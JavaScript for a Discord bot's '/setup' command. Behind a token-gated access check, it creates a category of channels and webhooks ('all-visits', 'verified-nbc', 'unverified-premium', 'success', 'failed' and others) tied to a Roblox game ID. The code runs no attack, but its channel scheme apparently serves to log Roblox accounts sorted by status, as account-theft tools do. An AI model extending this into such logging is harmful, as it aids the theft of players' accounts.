const { ApplicationCommandOptionType, Client, ChannelType, EmbedBuilder, Interaction, PermissionFlagsBits } = require('discord.js');
const { default: axios } = require('axios');
const fs = require('fs');
const path = require('path');
const WebhookData = require('../../models/WebhookData');
const Token = require('../../models/Token');

module.exports = {
  /**
   *
   * @param {Client} client
   * @param {Interaction} interaction
   */
  callback: async (client, interaction) => {
    if (!interaction.inGuild()) {
      interaction.reply('You can only run this command inside a server.');
      return;
    }

    const webhookData = {
        userId: interaction.user.id,
        guildId: interaction.guild.id,
        gameId: interaction.options.getString('game-id'),
        webhooks: {},
    }

    try {
      await interaction.deferReply();

      function getTimestamp() {
        const currentDate = new Date();
        return currentDate.toLocaleTimeString();
      }


      const denied = new EmbedBuilder()
      .setTitle('Access Denied')
      .setDescription('You do not have permission to run this command.')
      .setColor('#ff0000')
      .setTimestamp();

    const token = await Token.findOne({ userId: interaction.user.id });

    if (!token) {
      interaction.editReply({
        embeds: [denied],
        ephemeral: true,
      });
      console.log(`[${getTimestamp()}][ACCESS DENIED]: ${interaction.user.tag} tried to run the command /setup but they do not have access to this command.`);
      return;
    }

      const success = new EmbedBuilder()
        .setTitle('Server creation setup has been completed!')
        .addFields({ name: 'Please check your channels!', value: 'We have created the following channels for you: all-visits, verified-nbc, unverified-nbc, verified-premium, unverified-premium, success, failed. Please check your channels and make sure that the webhooks are set correctly.', inline: false })
        .setColor('#00FF00')
        .setTimestamp()
      
      const channelNames = ['all-visits', 'verified-nbc', 'unverified-nbc', 'verified-premium', 'unverified-premium', 'success', 'failed'];

        const category = await interaction.guild.channels.create({
            name: 'CARLR MGUI',
            type: ChannelType.GuildCategory,
            reason: 'This category was automatically created by CarlR MGUI.',
        });

      for (const channelName of channelNames) {
        const channel = await interaction.guild.channels.create({
          name: channelName,
          type: ChannelType.GuildText,
          parent: category,
          topic: 'This channel was automatically created by Project MGUI.',
        });
        
        console.log(`[${getTimestamp()}][CHANNEL CREATOR]: ${interaction.user.tag} has created a channel called ${channelName}! (Channel ID: ${channel.id})`);

        const webhook = await channel.createWebhook({
          name: channelName,
          avatar: 'https://th.bing.com/th/id/R.313d9b5a0dcd849ddf83ff5216915668?rik=%2f%2ftO3VpPmEMe8Q&riu=http%3a%2f%2f1000logos.net%2fwp-content%2fuploads%2f2017%2f07%2fColor-Roblox-Logo.png&ehk=HuF5BjSgs0WJah0NlaV9%2f3tr2Ec%2bECijA6z3H5Bn8c4%3d&risl=&pid=ImgRaw&r=0',
        });

        webhookData.webhooks[channelName] = webhook.url;
        console.log(`[${getTimestamp()}][WEBHOOK CREATOR]: ${interaction.user.tag} has created a webhook called ${channelName}! (Webhook ID: ${webhook.id})`);
        interaction.editReply({ embeds: [success] });

      }

      await WebhookData.create(webhookData);
      console.log(`[${getTimestamp()}][WEBHOOK DATABASE]: Webhooks have been added to the database!`);
    } catch (error) {
      const failed = new EmbedBuilder()
        .setTitle('Server creation setup has failed!')
        .setDescription('We already have a webhook for this channel. Please delete the webhook and try again.')
        .setColor('#FF0000')
        .setTimestamp()
        interaction.editReply({ embeds: [failed] });
      console.log(error);
    }
  },

  name: 'setup',
    description: 'Automatically setup channels and webhooks for your game!',
    options: [
      {
        name: 'game-id',
        description: 'The game ID of your game.',
        type: ApplicationCommandOptionType.String,
        required: true,
      },
    ],
    permissionsRequired: [PermissionFlagsBits.ManageChannels],
    botPermissions: [PermissionFlagsBits.ManageChannels],
}
